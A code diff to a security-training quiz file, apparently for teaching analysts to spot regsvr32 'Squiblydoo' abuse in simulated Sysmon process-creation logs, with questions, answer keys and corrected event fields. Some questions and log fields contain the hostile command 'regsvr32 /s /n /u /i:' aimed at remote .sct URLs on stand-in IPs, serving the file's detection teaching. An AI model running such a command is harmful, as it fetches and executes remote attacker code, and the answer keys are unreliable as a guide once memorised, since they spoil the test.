@@ -69,11 +69,12 @@
  * task content. it_verify_result/it_verify_message (never a raw field) is
  * the sanctioned benign-true-positive resolution mechanism for the analyst_choice control
  * case, exactly as used elsewhere on this platform. No raw field states a
- * conclusion (e.g. no invented "is_malicious" field) -- Signed/
- * SignatureStatus/Hashes are real, standard Sysmon Event ID 1 fields, and
- * a valid signature status on regsvr32.exe in the malicious case is
- * accurate (it genuinely is signed by Microsoft) and is used pedagogically
- * to reinforce that the signature itself is never the discriminator.
+ * conclusion (e.g. no invented "is_malicious" field) -- Company/
+ * OriginalFileName/Hashes are real, standard Sysmon Event ID 1 fields (Event 1
+ * has no Signed/Signature fields; those belong to Events 6 and 7), and the
+ * Microsoft version resource on regsvr32.exe in the malicious case is accurate
+ * and is used pedagogically to reinforce that the binary's own identity is
+ * never the discriminator.
  *
  * SOURCES consulted directly for this content:
  *  - MITRE ATT&CK, T1027.006 HTML Smuggling
@@ -262,7 +263,7 @@ export const roomsBatch49 = [
       {
         "type": "question" as const,
         "id": "hsl-q2",
-        "question": "A Sysmon record shows regsvr32.exe launched with the command line: regsvr32 /s /n /u /i:http://185.221.20.44/svc.sct scrobj.dll, parented by explorer.exe. Which technique does this match, and what makes it recognizable as abuse rather than a routine software installation registering a DLL?",
+        "question": "A Sysmon record shows regsvr32.exe launched with the command line: regsvr32 /s /n /u /i:http://203.0.113.44/svc.sct scrobj.dll, parented by explorer.exe. Which technique does this match, and what makes it recognizable as abuse rather than a routine software installation registering a DLL?",
         "options": [
           "T1218.010 (Regsvr32) -- the Squiblydoo pattern: a remote URL and scrobj.dll instead of a local application DLL path, with no installer such as msiexec.exe as an ancestor",
           "T1218.010 (Regsvr32), but routine -- explorer.exe as the parent shows a user-initiated action, which marks the registration as an ordinary self-install",
@@ -420,21 +421,24 @@ export const roomsBatch49 = [
           "raw": {
             "event.code": "1",
             "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
-            "winlog.computer_name": "LT-THN-4471",
-            "winlog.event_id": 1,
+            "winlog.provider_name": "Microsoft-Windows-Sysmon",
+            "winlog.computer_name": "LT-THN-4471.thornfieldlogistics.local",
+            "winlog.event_id": "1",
             "winlog.event_data.UtcTime": "2026-06-18 14:22:47.311",
             "winlog.event_data.ProcessGuid": "{8f2a1c4e-91b7-4a3d-8e02-6c9f1b3d7a58}",
             "winlog.event_data.ProcessId": "6820",
             "winlog.event_data.Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "winlog.event_data.FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+            "winlog.event_data.Description": "Microsoft(C) Register Server",
+            "winlog.event_data.Product": "Microsoft® Windows® Operating System",
+            "winlog.event_data.Company": "Microsoft Corporation",
+            "winlog.event_data.OriginalFileName": "REGSVR32.EXE",
             "winlog.event_data.CommandLine": "regsvr32.exe /s /n /u /i:http://198.51.100.77/invoice_svc.sct scrobj.dll",
             "winlog.event_data.CurrentDirectory": "C:\\Users\\r.esposito\\Downloads\\",
             "winlog.event_data.User": "THORNFIELDLOG\\r.esposito",
             "winlog.event_data.LogonId": "0x3a2f11",
             "winlog.event_data.IntegrityLevel": "Medium",
             "winlog.event_data.Hashes": "SHA256=A0A703F776AF7BD7B2E9C4363FA69888688B29AB36155713366EAE09CD65BA34",
-            "winlog.event_data.Signed": "true",
-            "winlog.event_data.Signature": "Microsoft Windows",
-            "winlog.event_data.SignatureStatus": "Valid",
             "winlog.event_data.ParentProcessGuid": "{2c7d9e11-4f83-4a02-9b6e-1d8a3c5f6e29}",
             "winlog.event_data.ParentProcessId": "2244",
             "winlog.event_data.ParentImage": "C:\\Windows\\explorer.exe",
@@ -448,10 +452,10 @@ export const roomsBatch49 = [
               "winlog.event_data.CommandLine carries the /i: flag pointed at a remote URL and targets scrobj.dll rather than a local application DLL, with no msiexec.exe or installer as the ParentImage",
               "winlog.event_data.CurrentDirectory is the user’s Downloads folder, which on its own marks the registration as Squiblydoo no matter what the command line or parent process shows",
               "winlog.event_data.ParentImage is explorer.exe rather than an installer, which by itself confirms abuse even before the command line is examined for a remote source",
-              "winlog.event_data.Signature reads Microsoft Windows and SignatureStatus is Valid, so the binary is trusted and the event can be closed without reading the command line"
+              "winlog.event_data.Company reads Microsoft Corporation and OriginalFileName is REGSVR32.EXE, so the binary is trusted and the event can be closed without reading the command line"
             ],
             "answer": 0,
-            "explanation": "This room’s regsvr32 reading names exactly this pairing: the /i: flag at a remote URL with scrobj.dll as the target, together with the absence of any installer ancestry, is the Squiblydoo shape. The Downloads CurrentDirectory is suggestive context but not the identifier on its own (benign downloads also run from there) so that option over-weights location. explorer.exe is the normal parent of anything a user opens, so the parent alone does not confirm abuse; it is the command line that carries the remote source, making that option wrong. The Valid Microsoft signature is expected here: regsvr32.exe genuinely is signed, so treating it as grounds to close the event inverts this room’s central point.",
+            "explanation": "This room’s regsvr32 reading names exactly this pairing: the /i: flag at a remote URL with scrobj.dll as the target, together with the absence of any installer ancestry, is the Squiblydoo shape. The Downloads CurrentDirectory is suggestive context but not the identifier on its own (benign downloads also run from there) so that option over-weights location. explorer.exe is the normal parent of anything a user opens, so the parent alone does not confirm abuse; it is the command line that carries the remote source, making that option wrong. The Microsoft Corporation company name and REGSVR32.EXE original file name are expected here: regsvr32.exe genuinely is Microsoft's own binary (and these are version-resource strings, not a signature check), so treating them as grounds to close the event inverts this room’s central point.",
             "xp": 20
           },
           {
@@ -527,20 +531,23 @@ export const roomsBatch49 = [
           "raw": {
             "event.code": "1",
             "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
-            "winlog.computer_name": "WKS-THN-2209",
-            "winlog.event_id": 1,
+            "winlog.provider_name": "Microsoft-Windows-Sysmon",
+            "winlog.computer_name": "WKS-THN-2209.thornfieldlogistics.local",
+            "winlog.event_id": "1",
             "winlog.event_data.UtcTime": "2026-06-20 02:15:03.884",
             "winlog.event_data.ProcessGuid": "{5b3e8a17-6c94-4d21-9f83-2a7e5c8b1d46}",
             "winlog.event_data.ProcessId": "5112",
             "winlog.event_data.Image": "C:\\Windows\\System32\\rundll32.exe",
+            "winlog.event_data.FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "winlog.event_data.Description": "Windows host process (Rundll32)",
+            "winlog.event_data.Product": "Microsoft® Windows® Operating System",
+            "winlog.event_data.Company": "Microsoft Corporation",
+            "winlog.event_data.OriginalFileName": "RUNDLL32.EXE",
             "winlog.event_data.CommandLine": "rundll32.exe C:\\Windows\\CCM\\WarehouseScanInstall.dll,DoInstall",
             "winlog.event_data.CurrentDirectory": "C:\\Windows\\CCM\\",
             "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
             "winlog.event_data.IntegrityLevel": "System",
             "winlog.event_data.Hashes": "SHA256=B15758AD5A250F27530FB367CDD3DB390E9F7FEA758681156CD700074FE22108",
-            "winlog.event_data.Signed": "true",
-            "winlog.event_data.Signature": "Microsoft Windows",
-            "winlog.event_data.SignatureStatus": "Valid",
             "winlog.event_data.ParentProcessGuid": "{9a1c4d72-3e88-4f0a-8b56-7d2c9e4a6f13}",
             "winlog.event_data.ParentProcessId": "3390",
             "winlog.event_data.ParentImage": "C:\\Windows\\CCM\\ccmexec.exe",
